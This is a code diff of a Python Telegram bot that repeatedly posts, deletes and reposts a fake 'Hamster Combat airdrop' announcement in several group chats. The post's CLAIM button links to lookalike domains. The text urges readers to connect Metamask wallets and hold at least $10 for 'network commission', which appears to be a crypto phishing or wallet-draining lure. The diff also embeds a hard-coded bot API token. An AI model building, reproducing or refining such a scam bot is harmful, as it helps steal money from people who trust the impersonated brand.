@@ -12,13 +12,13 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder
 # Configure logging
 logging.basicConfig(level=logging.INFO)
 
-API_TOKEN = ""
-GROUP_ID = -1001792317500
-GROUP_ID_TWO = -1001813741487
-GROUP_ID_THREE = -1001820466879
-MESSAGE_ID = 0
-MESSAGE_ID_TWO = 0
-MESSAGE_ID_THREE = 0
+API_TOKEN = "7320376976:AAEpYY8s8ZViOEbYgfFjtmG6-jNXnFhqo1Y"
+# GROUPS = [-1001792317500, -1001813741487, -1001820466879, -1001988747716]
+GROUPS = [-1001988747716]
+MESSAGES = []
+ME = 513284964
+SENDING = False
+REPLACE = False
 # Initialize bot and dispatcher
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
@@ -28,114 +28,82 @@ router = Router()
 
 
 text = """
-❗️Hamster Combat announces AIRDROP❗️
+🔥Hamster Combat announces AIRDROP 🔥
+❗️It is time to go WEB3❗️
+ 
+🤓 Some of you might have already seen that the first Airdrop Task has been added.
 
-Join the HamsterCombat airdrop and win your share of $500 in HMSTR tokens! 
-🎉 Participate easily through our airdrop bot and claim your rewards. This airdrop is FCFS (First Come, First Served) for the first 50,000 participants. 🚀
+🤩 If you already have a Metamask wallet, connect your wallet to our website.
+ 
+✍️ If you don't have a Metamask wallet, check out the guidelines on YouTube and in local communities to create one.
+It will take you less than a minute!
+ 
+👉 Connecting wallets is crucial, because.. how else will you receive an AirDrop?
 
-#HamsterCombat #Airdrop #HMSTR #CryptoGiveaway #Milestone #ThankYou #OnwardAndUpward #crypto #btc #memetoken #memecoin #hamster #taptap #clicker #game #p2e
-"""
 
-
-text1 = """
-❗️Announced AIRDROP Hamster Kombat ❗️ 
-
-🎉 Join the Hamster Kombat airdrop and win your share of $500 in HMSTR tokens!  🎉
-This airdrop is FCFS (First Come, First Served) for the first 50,000 participants.  🚀
-
-#HamsterCombat #Airdrop #HMSTR #CryptoGiveaway #Milestone #ThankYou #OnwardAndUpward #crypto #btc #memetoken #memecoin #hamster #taptap #clicker #game #p2e
+❗️❗️❗️ATTENTION ❗️ ❗️❗️
+We have noticed that many people are having difficulty claiming coins. Please note that your wallet must have at least $10 in equivalent to pay the network commission.
 """
 
 
 @router.message(Command("start"))
 async def send_new_post(message: types.Message, bot: Bot):
-    global MESSAGE_ID, GROUP_ID, GROUP_ID_TWO, MESSAGE_ID_TWO, GROUP_ID_THREE, MESSAGE_ID_THREE
+    global GROUPS, MESSAGES, SENDING, REPLACE
 
-    min10inSec = 60 * 5
+    while True:
 
-    keyboard_builder = InlineKeyboardBuilder()
-    keyboard_builder.add(
-        InlineKeyboardButton(
-            text="CLAIM",
-            url="https://hamsters-kombats.site/",
-        )
-    )
-    keyboard = keyboard_builder.as_markup()
+        SENDING = True
 
-    keyboard_builder1 = InlineKeyboardBuilder()
-    keyboard_builder1.add(
-        InlineKeyboardButton(
-            text="CLAIM",
-            url="https://hamster-combats.site",
-        )
-    )
-    keyboard1 = keyboard_builder1.as_markup()
+        if REPLACE:
+            SENDING = False
 
-    photo = FSInputFile("image.jpg")
-    photo1 = FSInputFile("image1.jpg")
+        if SENDING == False:
+            for m in MESSAGES:
+                await bot.delete_message(m["g"], m["m"])
+            REPLACE = False
+            MESSAGES = []
+            return
 
-    if MESSAGE_ID_TWO == 0 and MESSAGE_ID_THREE == 0 and MESSAGE_ID == 0:
+        try:
+            if len(MESSAGES) != 0:
+                for m in MESSAGES:
+                    await bot.delete_message(m["g"], m["m"])
 
-        message1 = await bot.send_photo(
-            GROUP_ID,
-            photo=photo,
-            caption=text,
-            reply_markup=keyboard,
-        )
+            MESSAGES = []
+            min10inSec = 120
 
-        message2 = await bot.send_photo(
-            GROUP_ID_TWO,
-            photo=photo,
-            caption=text,
-            reply_markup=keyboard,
-        )
+            keyboard_builder = InlineKeyboardBuilder()
+            keyboard_builder.add(
+                InlineKeyboardButton(
+                    text="CLAIM",
+                    url="https://hamster-combats.site",
+                )
+            )
+            keyboard = keyboard_builder.as_markup()
 
-        message3 = await bot.send_photo(
-            GROUP_ID_THREE,
-            photo=photo1,
-            caption=text1,
-            reply_markup=keyboard1,
-        )
+            photo = FSInputFile("image.jpg")
 
-        MESSAGE_ID = message1.message_id
-        MESSAGE_ID_TWO = message2.message_id
-        MESSAGE_ID_THREE = message3.message_id
+            for g in GROUPS:
+                m = await bot.send_photo(
+                    g,
+                    photo=photo,
+                    caption=text,
+                    reply_markup=keyboard,
+                )
+                MESSAGES.append({"g": g, "m": m.message_id})
 
-        await asyncio.sleep(min10inSec)
-        await send_new_post(message, bot)
-        return
+            await asyncio.sleep(min10inSec)
 
-    await bot.delete_message(chat_id=GROUP_ID, message_id=MESSAGE_ID)
-    await bot.delete_message(chat_id=GROUP_ID_TWO, message_id=MESSAGE_ID_TWO)
-    await bot.delete_message(chat_id=GROUP_ID_THREE, message_id=MESSAGE_ID_THREE)
+        except Exception as e:
+            print("Error - ", e)
 
-    message1 = await bot.send_photo(
-        GROUP_ID,
-        photo=photo,
-        caption=text,
-        reply_markup=keyboard,
-    )
 
-    message2 = await bot.send_photo(
-        GROUP_ID_TWO,
-        photo=photo,
-        caption=text,
-        reply_markup=keyboard,
-    )
+@router.message(Command("stop"))
+async def send_new_post(message: types.Message, bot: Bot):
+    global GROUPS, MESSAGES, SENDING, REPLACE
 
-    message3 = await bot.send_photo(
-        GROUP_ID_THREE,
-        photo=photo1,
-        caption=text1,
-        reply_markup=keyboard1,
-    )
-
-    MESSAGE_ID = message1.message_id
-    MESSAGE_ID_TWO = message2.message_id
-    MESSAGE_ID_THREE = message3.message_id
-
-    await asyncio.sleep(min10inSec)
-    await send_new_post(message, bot)
+    REPLACE = True
+    await message.answer("Sending stop")
 
 
 dp.include_router(router)
